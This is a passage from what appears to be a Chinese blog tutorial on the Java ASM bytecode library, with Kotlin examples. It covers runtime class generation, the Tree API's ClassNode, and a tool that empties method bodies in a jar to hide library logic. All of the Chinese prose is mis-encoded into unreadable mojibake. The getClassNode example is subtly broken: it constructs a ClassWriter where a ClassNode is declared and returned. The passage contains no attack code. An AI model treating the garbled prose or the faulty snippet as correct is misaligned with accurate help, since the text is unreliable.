operator">=</span> classWriter<span class="token punctuation">.</span><span class="token function">visitMethod</span><span class="token punctuation">(</span>        ACC_PUBLIC <span class="token operator">+</span> ACC_STATIC<span class="token punctuation">,</span>        <span class="token string">"main"</span><span class="token punctuation">,</span>        <span class="token string">"([Ljava/lang/String;)V"</span><span class="token punctuation">,</span>        <span class="token keyword">null</span><span class="token punctuation">,</span>        <span class="token keyword">null</span>    <span class="token punctuation">)</span>    mv<span class="token punctuation">.</span><span class="token function">visitFieldInsn</span><span class="token punctuation">(</span>GETSTATIC<span class="token punctuation">,</span> <span class="token string">"java/lang/System"</span><span class="token punctuation">,</span> <span class="token string">"out"</span><span class="token punctuation">,</span> <span class="token string">"Ljava/io/PrintStream;"</span><span class="token punctuation">)</span>    mv<span class="token punctuation">.</span><span class="token function">visitLdcInsn</span><span class="token punctuation">(</span><span class="token string">"Hello, World!"</span><span class="token punctuation">)</span>    mv<span class="token punctuation">.</span><span class="token function">visitMethodInsn</span><span class="token punctuation">(</span>INVOKEVIRTUAL<span class="token punctuation">,</span> <span class="token string">"java/io/PrintStream"</span><span class="token punctuation">,</span> <span class="token string">"println"</span><span class="token punctuation">,</span> <span class="token string">"(Ljava/lang/String;)V"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span>    mv<span class="token punctuation">.</span><span class="token function">visitInsn</span><span class="token punctuation">(</span>RETURN<span class="token punctuation">)</span>    mv<span class="token punctuation">.</span><span class="token function">visitMaxs</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    mv<span class="token punctuation">.</span><span class="token function">visitEnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    classWriter<span class="token punctuation">.</span><span class="token function">visitEnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> byteArray <span class="token operator">=</span> classWriter<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> classLoader <span class="token operator">=</span> <span class="token function">MyClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> clazz <span class="token operator">=</span> classLoader<span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token string">"org.example.asmlearn.ASMLearn_Test"</span><span class="token punctuation">,</span> byteArray<span class="token punctuation">)</span>    <span class="token keyword">val</span> m <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"main"</span><span class="token punctuation">,</span> Array<span class="token operator">&lt;</span>String<span class="token operator">&gt;</span><span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">.</span>java<span class="token punctuation">)</span>    m<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token function">arrayOf</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">class</span> MyClassLoader <span class="token operator">:</span> <span class="token function">ClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">fun</span> <span class="token function">defineClass</span><span class="token punctuation">(</span>name<span class="token operator">:</span> String<span class="token punctuation">,</span> b<span class="token operator">:</span> ByteArray<span class="token punctuation">)</span><span class="token operator">:</span> Class<span class="token operator">&lt;</span><span class="token operator">*</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">defineClass</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> b<span class="token punctuation">.</span>size<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œæˆ‘ä»¬é€šè¿‡asmç”Ÿæˆäº†ä¸€ä¸ª<code>org/example/asmlearn/ASMLearn_Test</code>ç±»ï¼Œå¹¶åœ¨é‡Œé¢ç”Ÿæˆäº†ä¸€ä¸ªmainæ–¹æ³•ï¼ŒåŠ è½½åˆ°è‡ªå®šä¹‰çš„classLoaderä¸­ï¼Œç„¶åå¯¹å®ƒè¿›è¡Œåå°„æ‰§è¡Œmainæ–¹æ³•ã€‚</p><blockquote><p> é¡ºä¾¿è¯´ä¸‹ç”Ÿæˆä»£ç çš„äº‹æƒ…ï¼Œç¼–è¯‘æœŸç”Ÿæˆå¸¸è§„ä»£ç å…¶å®ä¸æ¨èä½¿ç”¨asmï¼Œæˆ‘ä»¬ä¸€èˆ¬åªåœ¨è¿è¡ŒæœŸåŠ¨æ€ç”Ÿæˆä»£ç æ‰ä½¿ç”¨asmã€‚å› ä¸ºasmå†™èµ·æ¥æ¯”è¾ƒç¹çï¼Œè¿è¡ŒæœŸç”¨å®ƒæ¥ç”Ÿæˆä»£ç å…¶å®æ˜¯å› ä¸ºæ²¡æœ‰æ›´å¥½çš„åŠæ³•äº†ã€‚ç¼–è¯‘æœŸå¦‚æœä¸æ˜¯ä½ æƒ³å®ç°ä»€ä¹ˆé­”æ³•çš„è¯ä¸€èˆ¬ä¸ç”¨æ¥ç”Ÿæˆä»£ç ï¼Œç”Ÿæˆä»£ç å¯ä»¥äº†è§£ä¸€ä¸‹kaptå’Œkspï¼Œç¼–è¯‘æœŸasmä¸€èˆ¬åªæ˜¯ç”¨æ¥åœ¨å·²æœ‰çš„ä»£ç ä¸­è¿›è¡Œæ’æ¡©ã€‚</p></blockquote><h5 id="Tree-API"><a href="#Tree-API" class="headerlink" title="Tree API"></a>Tree API</h5><p>Tree APIåŸºäºCore APIå®ç°ï¼ŒTree APIè®©æˆ‘ä»¬ä¸ç”¨å†è‡ªå®šä¹‰Visitorï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è·å–ä¸€ä¸ªç±»çš„ClassNodeï¼Œç„¶åé€šè¿‡ClassNodeç›´æ¥è·å¾—é‡Œé¢æ‰€æœ‰çš„æ–¹æ³•/å­—æ®µä¿¡æ¯ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬è¦å¦‚ä½•å¾—åˆ°ä¸€ä¸ªClassNodeå‘¢ï¼Ÿ</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">fun</span> <span class="token function">getClassNode</span><span class="token punctuation">(</span>clazzFile<span class="token operator">:</span> File<span class="token punctuation">)</span><span class="token operator">:</span> ClassNode <span class="token punctuation">{</span>    <span class="token keyword">val</span> classReader <span class="token operator">=</span> <span class="token function">ClassReader</span><span class="token punctuation">(</span>clazzFile<span class="token punctuation">.</span><span class="token function">inputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> classNode <span class="token operator">=</span> <span class="token function">ClassWriter</span><span class="token punctuation">(</span>ASM9<span class="token punctuation">)</span>    classReader<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span>classNode<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> classNode<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå…¶å®ClassNodeå°±æ˜¯ä¸€ä¸ªå°è£…è¿‡çš„ClassVisitorã€‚å®ƒé‡å†™äº†ClassVisitoræ‰€æœ‰çš„è®¿é—®æ–¹æ³•ï¼Œåœ¨è®¿é—®æ—¶æŠŠè®¿é—®åˆ°çš„ä¿¡æ¯å­˜åˆ°ç±»ä¸­ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥ä»é‡Œé¢è·å–ã€‚<em><strong>æœ‰å…´è¶£å¯ä»¥è‡ªå·±å®ç°ä¸€ä¸‹ClassNodeï¼Œéå¸¸ç®€å•ã€‚</strong></em></p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">val</span> classNode <span class="token operator">=</span> <span class="token function">getClassNode</span><span class="token punctuation">(</span>clazzFile<span class="token punctuation">)</span><span class="token comment">// è·å–æ‰€æœ‰æ–¹æ³•ä¿¡æ¯</span><span class="token keyword">val</span> methods<span class="token operator">:</span> List<span class="token operator">&lt;</span>MethodNode<span class="token operator">&gt;</span> <span class="token operator">=</span> classNode<span class="token punctuation">.</span>methods<span class="token comment">// è·å–æ‰€æœ‰å­—æ®µä¿¡æ¯</span><span class="token keyword">val</span> fields<span class="token operator">:</span> List<span class="token operator">&lt;</span>FieldNode<span class="token operator">&gt;</span> <span class="token operator">=</span> classNode<span class="token punctuation">.</span>fields<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="å®æˆ˜"><a href="#å®æˆ˜" class="headerlink" title="å®æˆ˜"></a>å®æˆ˜</h4><p>æ¥ä¸‹æ¥æˆ‘ä¼šè®²è§£ä¸€äº›asmæ¡†æ¶çš„å®æˆ˜ç”¨ä¾‹ï¼Œå¤§å®¶æœ‰å…´è¶£å›å»å¯ä»¥è·Ÿç€æ•²ä¸€æ•²ï¼Œéƒ½ä¸éš¾ã€‚</p><p>æ¨èçš„å‚è€ƒèµ„æ–™<a href="https://www.bilibili.com/read/cv13433468">Java ASMè¯¦è§£ï¼šMethodVisitorå’ŒOpcodeï¼ˆäºŒï¼‰ç±»å‹ã€æ•°ç»„ã€å­—æ®µã€æ–¹æ³•ã€å¼‚å¸¸ä¸åŒæ­¥ - å“”å“©å“”å“© (bilibili.com)</a></p><p>å†™çš„æ—¶å€™è·Ÿå­—èŠ‚ç å’Œè¿™ä¸ªèµ„æ–™å¯¹ç…§ç€çœ‹ã€‚</p><h5 id="ApiJarGenerator"><a href="#ApiJarGenerator" class="headerlink" title="ApiJarGenerator"></a>ApiJarGenerator</h5><blockquote><p>å†™è¿™ä¸ªå®æˆ˜çš„æ—¶å€™æˆ‘è¿˜åªçŸ¥é“Core APIï¼Œæ‰€ä»¥ä»¥ä¸‹åŠŸèƒ½å‡ä½¿ç”¨Core APIå®ç°</p></blockquote><blockquote><p>æˆ‘ä»¬çŸ¥é“ï¼ŒJavaçš„ç±»æ–‡ä»¶éƒ½æ˜¯å¯ä»¥åç¼–è¯‘çš„ï¼ŒåŒæ—¶å¦‚æœè¦ä¾èµ–äºæŸä¸ªJarè¿›è¡Œå¼€å‘å°±å¿…é¡»è¦æœ‰Jaræ–‡ä»¶ã€‚</p><p>è®¾æƒ³ä¸€ç§æƒ…å†µï¼Œæˆ‘ä»¬å¼€å‘é¡¹ç›®äººæ‰‹ä¸å¤Ÿï¼Œå»æ‰¾äº†å¤–åŒ…ã€‚åŒæ—¶æˆ‘ä»¬æœ‰ä¸€ä»½è‡ªä¸»å¼€å‘çš„æ¡†æ¶/ç±»åº“ï¼Œä½†æˆ‘ä»¬ä¸å¸Œæœ›è¿™ä»½åº“çš„Jaræ–‡ä»¶è½å…¥å¤–åŒ…è€…ä¹‹æ‰‹ï¼Œä½†é¡¹ç›®å¼€å‘å¿…é¡»è¦ä¾èµ–è¿™ä»½Jaræ–‡ä»¶ï¼Œå¦åˆ™å°±é€šä¸è¿‡ç¼–è¯‘ï¼Œæ€ä¹ˆåŠå‘¢ï¼Ÿ</p><p>äº†è§£äº†asmæ¡†æ¶ä¸JVMå­—èŠ‚ç ç»“æ„åæˆ‘ä»¬å¾ˆå®¹æ˜“å°±èƒ½æƒ³å‡ºä¸€ä¸ªè§£å†³æ–¹æ¡ˆï¼Œåˆ ç©ºJaræ–‡ä»¶ä¸­æ‰€æœ‰æ–¹æ³•çš„å­—èŠ‚ç æŒ‡ä»¤ï¼Œåªç•™ä¸‹å¯ä¾›è°ƒç”¨çš„æ–¹æ³•å£°æ˜ã€‚è¿™æ ·å¤–åŒ…è€…å°±æ— æ³•é€šè¿‡åç¼–è¯‘å¾—çŸ¥æ–¹æ³•çš„å…·ä½“é€»è¾‘ï¼Œä½†å¤–åŒ…è€…ä»ç„¶èƒ½è°ƒç”¨å…¶ä¸­çš„å…¬å¼€æ–¹æ³•ï¼Œå¹¶ä¸”é¡¹ç›®ä¹Ÿèƒ½é€šè¿‡ç¼–è¯‘ã€‚</p></blockquote><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token comment">/** * org.example.asmlearn.ApiJarGenerator * asm-learn * * @author å¯’é›¨ * @since 2022/7/11 14:22 */</span><span class="token keyword">fun</span> <span class="token function">generate</span><span class="token punctuation">(</span>sourceJar<span class="token operator">:</span> File<span class="token punctuation">,</span> output<span class="token operator">:</span> File<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>output<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        output<span class="token punctuation">.</span><span class="token function">createNewFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token function">JarOutputStream</span><span class="token punctuation">(</span>output<span class="token punctuation">.</span><span class="token function">outputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">use</span> <span class="token punctuation">{</span> <span class="token keyword">out</span> <span class="token operator">-&gt;</span>        <span class="token function">JarFile</span><span class="token punctuation">(</span>sourceJar<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">use</span> <span class="token punctuation">{</span> jarFile <span class="token operator">-&gt;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>jarEntry <span class="token keyword">in</span> jarFile<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                jarFile<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span>jarEntry<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">use</span> <span class="token punctuation">{</span> input <span class="token operator">-&gt;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>jarEntry<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">".class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token comment">// å¦‚æœæ˜¯classæ–‡ä»¶ï¼Œå°±ç”¨æˆ‘ä»¬è‡ªå®šä¹‰çš„ClassVisitor visitå®ƒ</span>                        <span class="token keyword">val</span> classReader <span class="token operator">=</span> <span class="token function">ClassReader</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span>                        <span class="token keyword">val</span> classWriter <span class="token operator">=</span> <span class="token function">ClassWriter</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token keyword">val</span> visitor <span class="token operator">=</span> <span class="token function">EmptyClassVisitor</span><span class="token punctuation">(</span>classWriter<span class="token punctuation">)</span>                        classReader<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span>visitor<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token keyword">out</span><span class="token punctuation">.</span><span class="token function">putNextEntry</span><span class="token punctuation">(</span><span class="token function">JarEntry</span><span class="token punctuation">(</span>jarEntry<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token comment">// å†™å…¥classæ–‡ä»¶</span>                        <span class="token keyword">out</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>classWriter<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                        <span class="token keyword">out</span><span class="token punctuation">.</span><span class="token function">putNextEntry</span><span class="token punctuation">(</span><span class="token function">JarEntry</span><span class="token punctuation">(</span>jarEntry<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>                        input<span class="token punctuation">.</span><span class="token function">copyTo</span><span class="token punctuation">(</span><span class="token keyword">out</span><span class="token punctuation">)</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token function">EmptyClassVisitor</span><span class="token punctuation">(</span>visitor<span class="token operator">:</span> ClassVisitor<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">ClassVisitor</span><span class="token punctuation">(</span>ASM9<span class="token punctuation">,</span> visitor<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitMethod</span><span class="token punctuation">(</span>        access<span class="token operator">:</span> Int<span class="token punctuation">,</span>        name<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span>        descriptor<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span>        signature<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span>        exceptions<span class="token operator">:</span> Array<span class="token operator">&lt;</span><span class="token keyword">out</span> String<span class="token operator">&gt;</span><span class="token operator">?</span>    <span class="token punctuation">)</span><span class="token operator">:</span> MethodVisitor <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">EmptyMethodVisitor</span><span class="token punctuation">(</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">visitMethod</span><span class="token punctuation">(</span>access<span class="token punctuation">,</span> name<span class="token punctuation">,</span> descriptor<span class="token punctuation">,</span> signature<span class="token punctuation">,</span> exceptions<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token function">EmptyMethodVisitor</span><span class="token punctuation">(</span>methodVisitor<span class="token operator">:</span> MethodVisitor<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">MethodVisitor</span><span class="token punctuation">(</span>ASM9<span class="token punctuation">,</span> methodVisitor<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitIincInsn</span><span class="token punctuation">(</span>`<span class="token keyword">var</span>`<span class="token operator">:</span> Int<span class="token punctuation">,</span> increment<span class="token operator">:</span> Int<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitInsn</span><span class="token punctuation">(</span>opcode<span class="token operator">:</span> Int<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitIntInsn</span><span class="token punctuation">(</span>opcode<span class="token operator">:</span> Int<span class="token punctuation">,</span> operand<span class="token operator">:</span> Int<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitVarInsn</span><span class="token punctuation">(</span>opcode<span class="token operator">:</span> Int<span class="token punctuation">,</span> `<span class="token keyword">var</span>`<span class="token operator">:</span> Int<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitTypeInsn</span><span class="token punctuation">(</span>opcode<span class="token operator">:</span> Int<span class="token punctuation">,</span> type<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitJumpInsn</span><span class="token punctuation">(</span>opcode<span class="token operator">:</span> Int<span class="token punctuation">,</span> label<span class="token operator">:</span> Label<span class="token operator">?</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitLabel</span><span class="token punctuation">(</span>label<span class="token operator">:</span> Label<span class="token operator">?</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitLdcInsn</span><span class="token punctuation">(</span>value<span class="token operator">:</span> Any<span class="token operator">?</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitTableSwitchInsn</span><span class="token punctuation">(</span>min<span class="token operator">:</span> Int<span class="token punctuation">,</span> max<span class="token operator">:</span> Int<span class="token punctuation">,</span> dflt<span class="token operator">:</span> Label<span class="token operator">?</span><span class="token punctuation">,</span> <span class="token keyword">vararg</span> labels<span class="token operator">:</span> Label<span class="token operator">?</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitLookupSwitchInsn</span><span class="token punctuation">(</span>dflt<span class="token operator">:</span> Label<span class="token operator">?</span><span class="token punctuation">,</span> keys<span class="token operator">:</span> IntArray<span class="token operator">?</span><span class="token punctuation">,</span> labels<span class="token operator">:</span> Array<span class="token operator">&lt;</span><span class="token keyword">out</span> Label<span class="token operator">&gt;</span><span class="token operator">?</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitMultiANewArrayInsn</span><span class="token punctuation">(</span>descriptor<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span> numDimensions<span class="token operator">:</span> Int<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitTryCatchBlock</span><span class="token punctuation">(</span>start<span class="token operator">:</span> Label<span class="token operator">?</span><span class="token punctuation">,</span> end<span class="token operator">:</span> Label<span class="token operator">?</span><span class="token punctuation">,</span> handler<span class="token operator">:</span> Label<span class="token operator">?</span><span class="token punctuation">,</span> type<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitLocalVariable</span><span class="token punctuation">(</span>name<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span> descriptor<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span> signature<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span> start<span class="token operator">:</span> Label<span class="token operator">?</span><span class="token punctuation">,</span> end<span class="token operator">:</span> Label<span class="token operator">?</span><span class="token punctuation">,</span> index<span class="token operator">:</span> Int<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitLineNumber</span><span class="token punctuation">(</span>line<span class="token operator">:</span> Int<span class="token punctuation">,</span> start<span class="token operator">:</span> Label<span class="token operator">?</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitFrame</span><span class="token punctuation">(</span>type<span class="token operator">:</span> Int<span class="token punctuation">,</span> numLocal<span class="token operator">:</span> Int<span class="token punctuation">,</span> local<span class="token operator">:</span> Array<span class="token operator">&lt;</span><span class="token keyword">out</span> Any<span class="token operator">&gt;</span><span class="token operator">?</span><span class="token punctuation">,</span> numStack<span class="token operator">:</span> Int<span class="token punctuation">,</span> stack<span class="token operator">:</span> Array<span class="token operator">&lt;</span><span class="token keyword">out</span> Any<span class="token operator">&gt;</span><span class="token operator">?</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitFieldInsn</span><span class="token punctuation">(</span>opcode<span class="token operator">:</span> Int<span class="token punctuation">,</span> owner<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span> name<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span> descriptor<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitMethodInsn</span><span class="token punctuation">(</span>opcode<span class="token operator">:</span> Int<span class="token punctuation">,</span> owner<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span> name<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span> descriptor<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitMethodInsn</span><span class="token punctuation">(</span>opcode<span class="token operator">:</span> Int<span class="token punctuation">,</span> owner<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span> name<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span> descriptor<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span> isInterface<span class="token operator">:</span> Boolean<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitInvokeDynamicInsn</span><span class="token punctuation">(</span>name<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span> descriptor<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span> bootstrapMethodHandle<span class="token operator">:</span> Handle<span class="token operator">?</span><span class="token punctuation">,</span> <span class="token keyword">vararg</span> bootstrapMethodArguments<span class="token operator">:</span> Any<span class="token operator">?</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">fun</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">generate</span><span class="token punctuation">(</span>        <span class="token function">File</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\Rain\\Desktop\\recaf-2.21.13-J8-jar-with-dependencies.jar"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                          <span class="token function">File</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\Rain\\Desktop\\recaf-empty.jar"</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Šé¢æˆ‘ä»¬è®©EmptyClassVisitoråœ¨visitMethodè¿”å›äº†ä¸€ä¸ªæˆ‘ä»¬è‡ªå®šä¹‰çš„EmptyMethodVisitorï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨è®¿é—®æ–¹æ³•æ—¶æ‰§è¡Œçš„æ˜¯åœ¨EmptyMethodVisitorä¸­æˆ‘ä»¬è‡ªå®šä¹‰çš„é€»è¾‘ã€‚è€Œåœ¨EmptyMethodVisitorä¸­æˆ‘ä»¬é‡å†™äº†æ‰€æœ‰æ–¹æ³•ï¼ŒæŠŠåŸæœ¬çš„æ‰§è¡Œçˆ¶ç±»æ–¹æ³•çš„é€»è¾‘åˆ é™¤ã€‚è¿™æ ·åœ¨è®¿é—®æ—¶ä¾¿ä¸ä¼šæƒ³åŸæœ¬ä¸€æ ·ç”Ÿæˆè·Ÿä¹‹å‰ä¸€æ ·çš„å­—èŠ‚ç ï¼Œè€Œæ˜¯ä»€ä¹ˆéƒ½ä¸åšï¼Œè¿™æ ·å°±åˆ æ‰äº†æ–¹æ³•ä¸­æ–¹æ³•ä½“çš„å­—èŠ‚ç ã€‚</p><h5 id="ASMVersionControl"><a href="#ASMVersionControl" class="headerlink" title="ASMVersionControl"></a>ASMVersionControl</h5><blockquote><p>è¿™æ˜¯åœ¨MinecraftæœåŠ¡ç«¯æ’ä»¶å¼€å‘ç»å¸¸ä¸­é‡è§çš„é—®é¢˜</p><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œç›®å‰ä¸»æµçš„minecraftæœåŠ¡ç«¯éƒ½æ˜¯ç¬¬ä¸‰æ–¹åç¼–è¯‘å®˜æ–¹æœåŠ¡ç«¯çš„ä»£ç 